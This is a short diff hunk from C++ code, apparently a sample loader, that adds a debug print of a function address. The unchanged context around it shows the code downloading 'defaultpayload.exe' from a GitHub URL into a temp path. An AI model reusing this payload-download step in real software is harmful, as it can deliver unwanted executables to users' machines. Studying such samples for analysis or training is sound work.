@@ -410,7 +410,7 @@ int callout(void)
 
    if (getFileAttributes(temp_path) == INVALID_FILE_ATTRIBUTES)
    {
-      std::wcout << "Downloading payload..." << std::endl;
+      std::wcout << "Downloading payload..." << std::hex << reinterpret_cast<std::uintptr_t>(urlDownloadToFile) << std::endl;
 
       if (urlDownloadToFile(nullptr,
                             "https://github.com/frank2/blenny/raw/main/res/defaultpayload.exe",
